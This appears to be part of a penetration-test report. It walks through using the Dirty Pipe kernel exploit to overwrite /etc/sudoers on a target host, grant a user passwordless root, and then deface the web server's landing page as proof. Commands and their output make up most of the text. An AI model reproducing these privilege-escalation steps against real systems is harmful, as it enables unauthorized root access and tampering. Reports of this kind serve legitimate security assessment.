# Exploit

## Dirty Pipe

Since every good pentest report requires an exploit we opted for the Dirty Pipe exploit because it is fairly new and interesting. Since no `gcc` is installed on the target machine we downloaded the exploit file locally and compiled it with the `--static` flag to avoid `libc` mismatches. Finally, we copied the exploit binary to the target machine using `scp`.

Since we have can only overwrite files we have read access to we opted for the `/etc/sudoers` file which had misconfigured permissions. First we need to find a line we can safely overwrite.

```default
bluey@secureding:~/$ grep -n ^# /etc/sudoers
1:#
2:# This file MUST be edited with the 'visudo' command as root.
3:#
4:# Please consider adding local content in /etc/sudoers.d/ instead of
5:# directly modifying this file.
6:#
7:# See the man page for details on how to write a sudoers file.
8:#
13:# Host alias specification
15:# User alias specification
17:# Cmnd alias specification
19:# User privilege specification
22:# Allow members of group sudo to execute any command
25:# See sudoers(5) for more information on "@include" directives:
29:# allow bluey read-only access to /var/log/auth.log
```

Line 25 looks like a good match. We calculated the offset required for Dirty Pipe by counting the amount of characters up to line 25.

```default
bluey@secureding:~/$ offset=$(head -24 /etc/sudoers | wc -c)
```

We then inserted a rule to allow sudo access with no password for the user `bluey`. The command is terminated with a hashtag to comment out the rest of the remaining comment bytes.

```default
bluey@secureding:~/$ ./exploit /etc/sudoers $offset $'bluey    ALL=(ALL) NOPASSWD:ALL\n#'
It worked!
```

Now we can confirm that we are indeed able to run root tasks without password.

```default
bluey@secureding:~/$ sudo id
sudo: unable to resolve host secureding: Name or service not known
uid=0(root) gid=0(root) groups=0(root)
```

Taking a look in the `/etc/sudoers` file gives us the following output. For the original file look at the **Appendix II**.

```default
bluey@secureding:~$ cat /etc/sudoers
#
# This file MUST be edited with the 'visudo' command as root.
#
# Please consider adding local content in /etc/sudoers.d/ instead of
# directly modifying this file.
#
# See the man page for details on how to write a sudoers file.
#
Defaults        env_reset
Defaults        mail_badpass
Defaults        secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"

# Host alias specification

# User alias specification

# Cmnd alias specification

# User privilege specification
root    ALL=(ALL:ALL) ALL

# Allow members of group sudo to execute any command
%sudo   ALL=(ALL:ALL) ALL

bluey    ALL=(ALL) NOPASSWD:ALL
#tion on "@include" directives:

@includedir /etc/sudoers.d

# allow bluey read-only access to /var/log/auth.log
bluey ALL=NOPASSWD: /usr/bin/less /var/log/auth.log
```

## External Proof

To proof to our client that we have successfully gained root privileges on the server we have modified the landing page of the Apache2 webserver to our preferences. This can be easily verified by navigating to [http://10.1.0.5/](http://10.1.0.5/) using any modern web browser like `w3m`.
